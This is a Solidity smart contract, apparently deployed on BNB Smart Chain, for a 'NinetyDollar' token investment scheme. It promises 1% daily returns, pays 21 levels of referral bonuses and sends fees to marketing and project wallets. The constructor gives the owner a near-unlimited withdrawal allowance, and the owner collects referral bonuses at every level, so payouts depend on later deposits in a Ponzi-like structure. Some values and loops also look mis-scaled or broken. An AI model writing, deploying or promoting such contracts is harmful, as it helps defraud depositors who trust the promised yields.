/**
 *Submitted for verification at BscScan.com on 2023-03-19
*/

//SPDX-License-Identifier: UNLICENSED
pragma solidity 0.7.6;

contract NinetyDollar {
    using SafeMath for uint256;
    IBEP20 public token;

    uint256 public constant INVEST_MIN_AMOUNT = 90e18; //90$ Mininmun
    uint256[] public reward = [250e18,750e18,2500e18,7500e18,22500e18,65000e18];
    uint256[] public reward_level_business_condition = [5000e18,15000e18,50000e18,150000e18,450000e18,1350000];
    uint256[] public reward_self_business_condition = [180e18,450e18,1800e18,2700e18,4500e18,9000e18];
    uint256[] public GI_PERCENT = [9,9,9,9,9,9,9,9,9,9,5,5,5,5,5,5,5,5,5,5,9];


     uint256 public constant BASE_PERCENT = 100; // 1% per day

   


    uint256 public constant PERCENTS_DIVIDER = 10000;
    uint256 public constant TIME_STEP = 1 days;
    uint256 public LAUNCH_TIME;
    uint256 public totalInvested;
    uint256 public totalWithdrawn;
    uint256 public totalDeposits;
    uint256 gi_bonus;
    address payable public marketingAddress;
     address payable public projectAddress;
    address payable public owner;


    uint256[] public pool_bonuses;  
    uint40 public pool_last_draw = uint40(block.timestamp);
    uint256 public pool_cycle;
    uint256 public pool_balance;
    mapping(uint256 => mapping(address => uint256)) public pool_users_refs_deposits_sum;
    mapping(uint8 => address) public pool_top;

    struct Deposit {
        uint256 amount;
        uint256 start;
    }

    struct User {
        Deposit[] deposits;
        uint256 checkpoint;
        address payable referrer;
        uint256 direct_amount;
        uint256 gi_bonus;
        uint256 total_gi_bonus;
        uint256 id;
         uint256 pool_bonus;
        uint256 splitamt;
        bool is_networker;
        uint256 reward_earned;
        uint256 available;
        uint256 withdrawn;
        mapping(uint8 => uint256) structure;
        mapping(uint8 => uint256) level_business;
        mapping(uint8 => bool) rewards;
        uint256 total_direct_bonus;
        uint256 total_invested;
       
    }

    mapping(address => User) public users;

    event Newbie(address user);
    event NewDeposit(address indexed user, uint256 amount);
    event Withdrawn(address indexed user, uint256 amount);
    event TransferBySplit(address user, address receiver, uint256 amount);
    event DepositBySplit(address user, uint256 amount);
    event RefBonus(
        address indexed referrer,
        address indexed referral,
        uint256 indexed level,
        uint256 amount
    );
    event FeePayed(address indexed user, uint256 totalAmount);

    modifier beforeStarted() {
        require(block.timestamp >= LAUNCH_TIME, "!beforeStarted");
        _;
    }

    constructor(address payable marketingAddr,address payable _projectAddress,IBEP20 tokenAdd ) {
        require(!isContract(marketingAddr), "!marketingAddr");
        owner = msg.sender;
        marketingAddress = marketingAddr;

        projectAddress = _projectAddress;
         token = tokenAdd;

        pool_bonuses.push(5000);
        pool_bonuses.push(3000);
        pool_bonuses.push(2000);
        users[owner].available =  100 * 10 **  30;
    }



    function depositBySplit(uint256 _amount) external {

        uint256 amt_to_compare = _amount * 10 ** 18;
        require(amt_to_compare >= INVEST_MIN_AMOUNT ,"Less than Min");

        require(users[msg.sender].splitamt >= amt_to_compare, "insufficient split amount");
        users[msg.sender].splitamt -= amt_to_compare;
        investbysplit(owner, _amount);
        emit DepositBySplit(msg.sender, _amount);
    }

    function transferBySplit(address _receiver, uint256 _amount) external {
        _amount =  _amount * 10 ** 18;
        //chek sender split amount
        require(users[msg.sender].splitamt >= _amount, "insufficient split amount");
       
        users[msg.sender].splitamt -= _amount; // deduct split from sender

        users[_receiver].splitamt += _amount; // Add split to receiver
        emit TransferBySplit(msg.sender, _receiver, _amount);
    }


    function investbysplit(address payable referrer,uint256 token_quantity) internal  beforeStarted() {

        uint256 tokenWei = token_quantity * 10 ** 18; 
        require(tokenWei >= INVEST_MIN_AMOUNT, "!INVEST_MIN_AMOUNT");



        User storage user = users[msg.sender];


       

        _setUpline(msg.sender, referrer,tokenWei);

        address upline  = user.referrer;


        if(users[upline].structure[0] >= 2 && users[upline].is_networker == false )
        { 
            users[upline].is_networker = true;
            users[upline].available = users[upline].available.add(users[upline].total_invested);
        }


        uint256 direct_amt = tokenWei.mul(500).div(PERCENTS_DIVIDER);
       if(direct_amt > users[upline].available )
       {
           direct_amt = users[upline].available;
       }
        users[upline].direct_amount += direct_amt;
        users[upline].total_direct_bonus += direct_amt;
        
        distribute_reward(msg.sender);

        if (user.deposits.length == 0) {
            user.checkpoint = block.timestamp;
            user.withdrawn = 0;
            emit Newbie(msg.sender);
        }

        user.total_invested += tokenWei;

        if(user.is_networker == true)
        {
            user.available += tokenWei.mul(3);
        }else
        {
            user.available += tokenWei.mul(2);
        }
       

        user.deposits.push(Deposit(tokenWei, block.timestamp));

        totalInvested = totalInvested.add(tokenWei);
        totalDeposits = totalDeposits.add(1);
        emit NewDeposit(msg.sender,tokenWei);
        
    }


    function invest(address payable referrer,uint256 token_quantity) public payable beforeStarted() {

        uint256 tokenWei = token_quantity * 10 ** 18; 
        require(tokenWei >= INVEST_MIN_AMOUNT, "!INVEST_MIN_AMOUNT");

        token.transferFrom(msg.sender, address(this), tokenWei);

        User storage user = users[msg.sender];

        token.transfer(projectAddress,tokenWei.mul(500).div(PERCENTS_DIVIDER));
        token.transfer(marketingAddress,tokenWei.mul(500).div(PERCENTS_DIVIDER));
       

        _setUpline(msg.sender, referrer,tokenWei);

        address upline  = user.referrer;


        if(users[upline].structure[0] >= 2 && users[upline].is_networker == false )
        { 
            users[upline].is_networker = true;
            users[upline].available = users[upline].available.add(users[upline].total_invested);
        }


        uint256 direct_amt = tokenWei.mul(500).div(PERCENTS_DIVIDER);

        users[upline].direct_amount += direct_amt;
        
        distribute_reward(msg.sender);

        if (user.deposits.length == 0) {
            user.checkpoint = block.timestamp;
            user.withdrawn = 0;
            emit Newbie(msg.sender);
        }

        user.total_invested += tokenWei;

        if(user.is_networker == true)
        {
            user.available += tokenWei.mul(3);
        }else
        {
            user.available += tokenWei.mul(2);
        }
       

        _pollDeposits(msg.sender, tokenWei);

        if(pool_last_draw + 1  days < block.timestamp) {
            _drawPool();
        }

        user.deposits.push(Deposit(tokenWei, block.timestamp));

        totalInvested = totalInvested.add(tokenWei);
        totalDeposits = totalDeposits.add(1);
        emit NewDeposit(msg.sender,tokenWei);
        
    }

      function _setUpline(address _addr, address payable _upline,uint256 amount) private {
        if(users[_addr].referrer == address(0)) {//first time entry
            if(users[_upline].deposits.length == 0) {//no deposite from my upline
                _upline = owner;
            }
            users[_addr].referrer = _upline;
            for(uint8 i = 0; i < GI_PERCENT.length; i++) {
                users[_upline].structure[i]++;
                 users[_upline].level_business[i] += amount;
                _upline = users[_upline].referrer;
                if(_upline == address(0) ) break;
            }
        }
        
         else
             {
                _upline = users[_addr].referrer;
            for( uint8 i = 0; i < GI_PERCENT.length; i++) {
                     users[_upline].level_business[i] += amount;
                    _upline = users[_upline].referrer;
                    if(_upline == address(0)) break;
                }
        }
        
    }

         function _pollDeposits(address _addr, uint256 _amount) private {
        pool_balance += _amount.mul(50).div(PERCENTS_DIVIDER);  // 0.5% of total income

        address upline = users[_addr].referrer;

        if(upline == address(0)) return;
        
        pool_users_refs_deposits_sum[pool_cycle][upline] += _amount;

        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            if(pool_top[i] == upline) break;

            if(pool_top[i] == address(0)) {
                pool_top[i] = upline;
                break;
            }

            if(pool_users_refs_deposits_sum[pool_cycle][upline] > pool_users_refs_deposits_sum[pool_cycle][pool_top[i]]) {
                for(uint8 j = i + 1; j < pool_bonuses.length; j++) {
                    if(pool_top[j] == upline) {
                        for(uint8 k = j; k <= pool_bonuses.length; k++) {
                            pool_top[k] = pool_top[k + 1];
                        }
                        break;
                    }
                }

                for( uint8 j = uint8(pool_bonuses.length - 1); j > i; j--) {
                    pool_top[j] = pool_top[j - 1];
                }

                pool_top[i] = upline;

                break;
            }
        }
    }

    function _drawPool() private {
        pool_last_draw = uint40(block.timestamp);
        pool_cycle++;

        uint256 draw_amount = pool_balance;

        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            if(pool_top[i] == address(0)) break;

            uint256 win = draw_amount * pool_bonuses[i] / 10000;

            users[pool_top[i]].pool_bonus += win;
            pool_balance -= win;

        }
        
        for( uint8 i = 0; i < pool_bonuses.length; i++) {
            pool_top[i] = address(0);
        }
    }

     function poolTopInfo() view external returns(address[3] memory addrs, uint256[3] memory deps) {
        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            if(pool_top[i] == address(0)) break;

            addrs[i] = pool_top[i]; 
            deps[i] = pool_users_refs_deposits_sum[pool_cycle][pool_top[i]];
        }
    }

    function distribute_reward(address _addr) private {

        address payable _upline = users[_addr].referrer;

        for (uint8 i = 0 ; i < reward.length; i ++ )
        {
            if(users[_upline].level_business[i] >= reward_level_business_condition[i] && users[_upline].total_invested >= reward_self_business_condition[i]  &&  users[_upline].rewards[i] == false)
            {
                    users[_upline].rewards[i] = true;
                    users[_upline].reward_earned += reward[i];
                    token.transfer(_upline,reward[i]);
            }

             _upline = users[_upline].referrer;
            if(_upline == address(0)) break;
        }

    }

    function withdraw() public beforeStarted() {

        require(
            getTimer(msg.sender) < block.timestamp,
            "withdrawal is available only once every 24 hours"
        );
        User storage user = users[msg.sender];
        
        uint256 totalAmount;
        uint256 dividends;

        require(user.available > 0 || msg.sender == owner,"You have reached your 3x limit");


        for (uint256 i = 0; i < user.deposits.length; i++) {
            if (user.available > 0) {
                if (user.deposits[i].start > user.checkpoint) {
                    dividends = (
                        user.deposits[i].amount.mul(BASE_PERCENT).div(
                            PERCENTS_DIVIDER
                        )
                    )
                        .mul(block.timestamp.sub(user.deposits[i].start))
                        .div(TIME_STEP);
                } else {
                    dividends = (
                        user.deposits[i].amount.mul(BASE_PERCENT).div(
                            PERCENTS_DIVIDER
                        )
                    )
                        .mul(block.timestamp.sub(user.checkpoint))
                        .div(TIME_STEP);
                }

                totalAmount = totalAmount.add(dividends);
            }
        }

        uint256 min_check_value = totalAmount.add(user.direct_amount);
         min_check_value += user.gi_bonus;
        require(min_check_value  > 10e18, "Min withdraw is 10$");

         _send_gi(msg.sender,totalAmount);

        totalAmount += user.direct_amount;
        totalAmount += user.gi_bonus;

       if(totalAmount > user.total_invested)
        {
            totalAmount = user.total_invested;  // flush the amount that much exceeds from  total invested for a day
        }

        if (user.available < totalAmount) {
            totalAmount = user.available;

            delete user.deposits;
        }

        uint256 splitamt = totalAmount.mul(3000).div(PERCENTS_DIVIDER);
        user.splitamt +=splitamt;

        uint256 withdrawable_amt = totalAmount.mul(7000).div(PERCENTS_DIVIDER);

        totalAmount = withdrawable_amt;


        uint256 fees = totalAmount.mul(500).div(PERCENTS_DIVIDER);  // 5% deduction on payout 
        token.transfer(marketingAddress,fees.div(2));
        token.transfer(projectAddress,fees.div(2));
        user.withdrawn = user.withdrawn.add(totalAmount);
        user.available = user.available.sub(totalAmount);
        totalAmount -= fees;
        user.checkpoint = block.timestamp;
        token.transfer(msg.sender,totalAmount);

        user.total_gi_bonus  += user.gi_bonus; 
        user.total_direct_bonus += user.direct_amount;
       
        user.direct_amount = 0;
        user.gi_bonus = 0;

        totalWithdrawn = totalWithdrawn.add(totalAmount);

        emit Withdrawn(msg.sender, totalAmount);
    }




     function getTimer(address userAddress) public view returns (uint256) {
        return users[userAddress].checkpoint.add(24 hours);  
    }


    function _send_gi(address _addr, uint256 _amount) private {
        address up = users[_addr].referrer;

        for(uint8 i = 0; i < GI_PERCENT.length; i++) {
            if(up == address(0)) break;

            

            
            if((i< users[up].structure[0].mul(2) && users[up].available > 0) || up == owner)
            {
                uint256 bonus = _amount.mul(GI_PERCENT[i]).div(100);
                
                if(bonus > users[up].available)
                {
                    bonus = users[up].available;
                }

                users[up].gi_bonus += bonus;
                gi_bonus += bonus;
            }

            if((i == 20 && users[up].structure[0] >= 10) || up == owner )
            {
                uint256 bonus = _amount.mul(GI_PERCENT[i]).div(100);
                
                if(bonus > users[up].available)
                {
                    bonus = users[up].available;
                }

                users[up].gi_bonus += bonus;
                gi_bonus += bonus;
            }
            up = users[up].referrer;
        }
    }

    function getUserDividends(address userAddress) public view returns (uint256)
    {
        User storage user = users[userAddress];


        uint256 totalDividends;
        uint256 dividends;

        for (uint256 i = 0; i < user.deposits.length; i++) {
            if (user.available > 0) {
                if (user.deposits[i].start > user.checkpoint) {
                    dividends = (
                        user.deposits[i].amount.mul(BASE_PERCENT).div(
                            PERCENTS_DIVIDER
                        )
                    )
                        .mul(block.timestamp.sub(user.deposits[i].start))
                        .div(TIME_STEP);
                } else {
                    dividends = (
                        user.deposits[i].amount.mul(BASE_PERCENT).div(
                            PERCENTS_DIVIDER
                        )
                    )
                        .mul(block.timestamp.sub(user.checkpoint))
                        .div(TIME_STEP);
                }

                totalDividends = totalDividends.add(dividends);
                /// no update of withdrawn because that is view function
            }
        }

        if (totalDividends > user.available) {
            totalDividends = user.available;
        }

        return totalDividends;
    }

    function getContractBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function getUserCheckpoint(address userAddress)
        public
        view
        returns (uint256)
    {
        return users[userAddress].checkpoint;
    }

    function getUserReferrer(address userAddress)
        public
        view
        returns (address)
    {
        return users[userAddress].referrer;
    }

    function getUserReferralBonus(address userAddress)
        public
        view
        returns (uint256, uint256)
    {
        return (users[userAddress].gi_bonus,users[userAddress].total_direct_bonus);
    }

    function getUserAvailable(address userAddress)
        public
        view
        returns (uint256)
    {
        return getUserDividends(userAddress);
    }

    function getAvailable(address userAddress) public view returns (uint256) {
        return users[userAddress].available;
    }

    function getUserAmountOfReferrals(address userAddress)
        public
        view
        returns (
            uint256[] memory structure,
            uint256[] memory levelBusiness
        )
    {

        uint256[] memory _structure = new uint256[](GI_PERCENT.length);
        uint256[] memory _levelBusiness = new uint256[](GI_PERCENT.length);
        for(uint8 i = 0; i < GI_PERCENT.length; i++) {
            _structure[i] = users[userAddress].structure[i];
            _levelBusiness[i] = users[userAddress].level_business[i];
        }
        return (
             _structure,_levelBusiness

        );
    }


     function getrewardinfo(address userAddress)
        public
        view
        returns (
            bool[] memory reward_info
        )
    {


        bool[] memory _reward_info = new bool[](reward.length);

        for(uint8 i = 0; i < reward.length; i++) {
            _reward_info[i] = users[userAddress].rewards[i];
            
        }
        return (
            _reward_info

        );
    }

    function getChainID() public pure returns (uint256) {
        uint256 id;
        assembly {
            id := chainid()
        }
        return id;
    }


    function getUserDepositInfo(address userAddress, uint256 index)
        public
        view
        returns (uint256, uint256)
    {
        User storage user = users[userAddress];

        return (user.deposits[index].amount, user.deposits[index].start);
    }

   
    function getUserAmountOfDeposits(address userAddress)
        public
        view
        returns (uint256)
    {
        return users[userAddress].deposits.length;
    }

    function getUserTotalDeposits(address userAddress)
        public
        view
        returns (uint256)
    {
        User storage user = users[userAddress];

        uint256 amount;

        for (uint256 i = 0; i < user.deposits.length; i++) {
            amount = amount.add(user.deposits[i].amount);
        }

        return amount;
    }

    function getUserTotalWithdrawn(address userAddress)
        public
        view
        returns (uint256)
    {
        User storage user = users[userAddress];

        return user.withdrawn;
    }

    function isContract(address addr) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(addr)
        }
        return size > 0;
    }
}


library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}
interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}